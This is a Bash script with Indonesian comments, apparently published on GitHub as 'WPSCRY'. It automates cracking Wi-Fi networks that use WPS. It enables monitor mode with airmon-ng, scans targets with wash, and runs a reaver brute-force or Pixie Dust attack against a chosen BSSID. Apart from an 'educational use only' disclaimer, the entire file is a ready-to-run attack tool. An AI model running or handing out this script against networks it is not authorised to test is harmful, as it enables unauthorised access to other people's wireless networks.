#!/bin/bash
# [wpscry.sh]
#--------------------------------------------------------------------------------
#
# Crack Wi-Fi yang menggunakan fitur WPS (Wi-Fi Protected Setup) secara otomatis.
#
#--------------------------------------------------------------------------------
#
# Peringatan
#
# Penggunaan script ini sepenuhnya merupakan tanggung jawab pengguna.
# WPSCRY dirancang untuk tujuan pendidikan dan pembelajaran.
# Penggunaan script ini untuk mengakses jaringan tanpa izin adalah
# ilegal dan dapat mengakibatkan konsekuensi hukum. Pembuat tidak
# bertanggung jawab atas penyalahgunaan atau kerusakan yang mungkin
# terjadi akibat penggunaan script ini.
#
#--------------------------------------------------------------------------------
#
# Pembuat script : Rofi (fixploit03)
# Github : https://github.com/fixploit03/WPSCRY
#
#--------------------------------------------------------------------------------

function cek_root(){
	if [[ $EUID -ne 0 ]]; then
		echo "[-] Script ini harus dijalankan sebagai root."
		exit 1
	fi
}

function peringatan(){
	echo "#######################################################################"
	echo "# Peringatan                                                          #"
	echo "#                                                                     #"
	echo "# Penggunaan script ini sepenuhnya merupakan tanggung jawab pengguna. #"
	echo "# WPSCRY dirancang untuk tujuan pendidikan dan pembelajaran.          #"
	echo "# Penggunaan script ini untuk mengakses jaringan tanpa izin adalah    #"
	echo "# ilegal dan dapat mengakibatkan konsekuensi hukum. Pembuat tidak     #"
	echo "# bertanggung jawab atas penyalahgunaan atau kerusakan yang mungkin   #"
	echo "# terjadi akibat penggunaan script ini.                               #"
	echo "#######################################################################"
	echo ""
	while true; do
		read -p "[#] Apakah Anda ingin melanjutkannya [Y/n]: " konfirmasi
		if [[ "${konfirmasi}" == "y" || "${konfirmasi}" == "Y" ]]; then
			break
		elif [[ "${konfirmasi}" == "n" || "${konfirmasi}" == "N" ]]; then
			echo "[*] Semoga harimu menyenangkan ^_^"
			exit 0
		else
			echo "[-] Masukkan tidak valid. Harap masukkan 'Y/n'."
			continue
		fi
	done
}

function cek_alat(){

	daftar_alat_yang_belum_terinstal=()

	daftar_alat=(
		"reaver"
		"airmon-ng"
		"iwconfig"
		"iw"
		"pixiewps"
	)

	for cek_alat in "${daftar_alat[@]}"; do
		if [[ ! $(command -v "${cek_alat}") ]]; then
			daftar_alat_yang_belum_terinstal+=("${cek_alat}")
		fi
	done

	if [[ "${#daftar_alat_yang_belum_terinstal[@]}" -gt 0 ]]; then
		if [[ "${#daftar_alat_yang_belum_terinstal[@]}" -eq 1 ]]; then
			echo "[-] Script ini tidak dapat dijalankan karena ada alat yang belum terinstal."
			echo ""
			echo "Alat yang belum terinstal:"
			echo ""
			echo "${daftar_alat_yang_belum_terinstal[0]}"
			exit 1
		else
			echo "[-] Script ini tidak dapat dijalankan karena ada beberapa alat yang belum terinstal."
			echo ""
			echo "Alat-alat yang belum terinstal:"
			echo ""
			for alat_belum_terinstal in "${daftar_alat_yang_belum_terinstal[@]}"; do
				echo "- ${alat_belum_terinstal}"
			done
			exit 1
		fi
	fi

}

function menampilkan_waktu_saat_ini(){
	hari=$(date +%A)

	if [[ "${hari}" == "Monday" ]]; then
    		hari="Senin"
	elif [[ "${hari}" == "Tuesday" ]]; then
    		hari="Selasa"
	elif [[ "${hari}" == "Wednesday" ]]; then
    		hari="Rabu"
	elif [[ "${hari}" == "Thursday" ]]; then
    		hari="Kamis"
	elif [[ "${hari}" == "Friday" ]]; then
    		hari="Jumat"
	elif [[ "${hari}" == "Saturday" ]]; then
    		hari="Sabtu"
	elif [[ "${hari}" == "Sunday" ]]; then
    		hari="Minggu"
	fi

	tanggal=$(date +%e)

	bulan=$(date +%B)

	if [[ "${bulan}" == "January" ]]; then
    		bulan="Januari"
	elif [[ "${bulan}" == "February" ]]; then
    		bulan="Februari"
	elif [[ "${bulan}" == "March" ]]; then
    		bulan="Maret"
	elif [[ "${bulan}" == "April" ]]; then
   		 bulan="April"
	elif [[ "${bulan}" == "May" ]]; then
    		bulan="Mei"
	elif [[ "${bulan}" == "June" ]]; then
    		bulan="Juni"
	elif [[ "${bulan}" == "July" ]]; then
    		bulan="Juli"
	elif [[ "${bulan}" == "August" ]]; then
    		bulan="Agustus"
	elif [[ "${bulan}" == "September" ]]; then
    		bulan="September"
	elif [[ "${bulan}" == "October" ]]; then
    		bulan="Oktober"
	elif [[ "${bulan}" == "November" ]]; then
    		bulan="November"
	elif [[ "${bulan}" == "December" ]]; then
    		bulan="Desember"
	fi

	tahun=$(date +%Y)

	jam=$(date +"%H:%M:%S")

	echo "[${hari}, ${tanggal} ${bulan} ${tahun} - ${jam}]"
	echo ""

}

function banner(){
	clear
	menampilkan_waktu_saat_ini
	echo "╦ ╦  ╔═╗  ╔═╗  ╔═╗  ╦═╗  ╦ ╦"
	echo "║║║  ╠═╝  ╚═╗  ║    ╠╦╝  ╚╦╝"
	echo "╚╩╝  ╩    ╚═╝  ╚═╝  ╩╚═   ╩ "
}

function menampilkan_interface_wifi(){
	interface_wifi=($(iw dev | grep -w 'Interface' | awk '{print $2}'))

	if [[ "${#interface_wifi[@]}" -eq 0 ]]; then
		echo "[-] Tidak ada interface Wi-Fi yang ditemukan."
		exit 1
	else
		echo ""
		echo "Interface Wi-Fi yang ditemukan:"
		echo ""
		for interface in "${interface_wifi[@]}"; do
			echo "[+] ${interface}"
		done
		echo ""
	fi

}

function memasukkan_interface_wifi(){
	while true; do
		read -p "[#] Masukkan nama interface Wi-Fi: " iwifi
		if [[ -z "${iwifi}" ]]; then
			echo "[-] Nama interface Wi-Fi tidak boleh kosong."
			continue
		else
			if [[ $(iw dev | grep -w 'Interface' | awk '{print $2}' | grep -w "${iwifi}") ]]; then
				echo "[+] Interface '${iwifi}' ditemukan."
				break
			else
				echo "[-] Interface '${iwifi}' tidak ditemukan."
				continue
			fi
		fi
	done
}


function mengaktifkan_mode_monitor(){
	airmon-ng check kill &>/dev/null
	if [[ $(iwconfig "${iwifi}" | grep -w 'Mode:Monitor') ]]; then
		echo "[+] Interface '${iwifi}' sudah dalam mode monitor."
	else
		echo "[-] Interface '${iwifi}' belum dalam mode monitor."
		echo "[*] Mengaktifkan mode monitor pada interface '${iwifi}'..."
		airmon-ng start "${iwifi}" &>/dev/null
		if [[ $? -eq 0 ]]; then
			if [[ $(iw dev | grep -w 'Interface' | awk '{print $2}' | grep -w "${iwifi}mon") ]]; then
				iwifi="${iwifi}mon"
			else
				iwifi="${iwifi}"
			fi
			echo "[+] Berhasil mengaktifkan mode monitor pada interface '${iwifi}'."
		else
			echo "[-] Gagal mengaktifkan mode monitor pada interface '${iwifi}'."
			exit 1
		fi
	fi
}

function memindai_wifi_wps(){
	echo "[*] Memindai Wi-Fi yang menggunakan fitur WPS (Tekan CTRL+C untuk menghentikan pemindaian)..."
	echo ""
	wash -i "${iwifi}"
}

function mengatur_bssid(){
	while true; do
		read -p "[#] Masukkan BSSID: " bssid
		if [[ -z "${bssid}" ]]; then
			echo "[-] BSSID tidak boleh kosong."
			continue
		else
			if [[ "${bssid}" =~ ^([0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$ ]]; then
				echo "[+] BSSID: ${bssid}"
				break
			else
				echo "[-] BSSID tidak valid."
				continue
			fi
		fi
	done
}

function mengatur_channel(){
	while true; do
		read -p "[#] Masukkan Channel: " channel
		if [[ -z "${channel}" ]]; then
			echo "[-] Channel tidak boleh kosong."
			continue
		else
			if [[ "${channel}" =~ ^[0-9]+$ ]]; then
				echo "[+] Channel: ${channel}"
				break
			else
				echo "[-] Channel tidak valid."
				continue
			fi
		fi
	done
}

function memilih_mode_verbose(){
	echo ""
	echo "Mode verbose yang tersedia:"
	echo ""
	echo "[0] Level 0 (Tanpa mode verbose)"
	echo "[1] Level 1 (Cukup detail)"
	echo "[2] Level 2 (Detail)"
	echo "[3] Level 3 (Sangat detail)"
	echo ""
	while true; do
		read -p "[#] Pilih mode verbose: " mode_verbose
		if [[ -z "${mode_verbose}" ]]; then
			echo "[-] Mode verbose tidak boleh kosong."
			continue
		else
			if [[ "${mode_verbose}" == "0" ]]; then
				verbose=""
				echo "[+] Mode verbose: Level 0 (Tanpa mode verbose)"
				break
			elif [[ "${mode_verbose}" == "1" ]]; then
				verbose="-v"
				echo "[+] Mode verbose: Level 1 (Cukup detail)"
				break
			elif [[ "${mode_verbose}" == "2" ]]; then
				verbose="-vv"
				echo "[+] Mode verbose: Level 2 (Detail)"
				break
			elif [[ "${mode_verbose}" == "3" ]]; then
				verbose="-vvv"
				echo "[+] Mode verbose: Level 3 (Sangat detail)"
				break
			else
				echo "[-] Mode verbose '${mode_verbose}' tidak tersedia."
				continue
			fi
		fi
	done
}

function menjalankan_reaver(){
	file_sesi="${bssid}_${jam}.txt"

	while true; do
		read -p "[#] Mau menggunakan Pixie Dust attack [N/y]: " nanya_pixie
		if [[ "${nanya_pixie}" == "y" || "${nanya_pixie}" == "Y" ]]; then
			pixie="--pixie-dust"
			break
		elif [[ "${nanya_pixie}" == "n" || "${nanya_pixie}" == "N" ]]; then
			pixie=""
			break
		else
			echo "[-] Masukkan tidak valid. Harap masukkan 'Y/n'."
			continue
		fi
	done

	echo ""
	read -p "Tekan [Enter] untuk memulai serangan..."

	reaver -i "${iwifi}" -b "${bssid}" -c "${channel}" -s "${file_sesi}" "${verbose}" "${pixie}" -p

	if [[ -f "${file_sesi}" ]]; then
		rm "${file_sesi}"
	fi
}


function menonaktifkan_mode_monitor(){
	echo "[*] Menonaktifkan mode monitor pada interface '${iwifi}'..."
	airmon-ng stop "${iwifi}" &>/dev/null
	if [[ $? -eq 0 ]]; then
		systemctl start NetworkManager
		echo "[+] Berhasil menonaktifkan mode monitor pada interface '${iwifi}'."
		exit 0
	else
		echo "[-] Gagal menonaktifkan mode monitor pada interface '${iwifi}'."
		exit 1
	fi
}


function main(){
	cek_root
	peringatan
	cek_alat
	banner
	menampilkan_interface_wifi
	memasukkan_interface_wifi
	mengaktifkan_mode_monitor
	memindai_wifi_wps
	mengatur_bssid
	mengatur_channel
	memilih_mode_verbose
	menjalankan_reaver
	menonaktifkan_mode_monitor
}


main

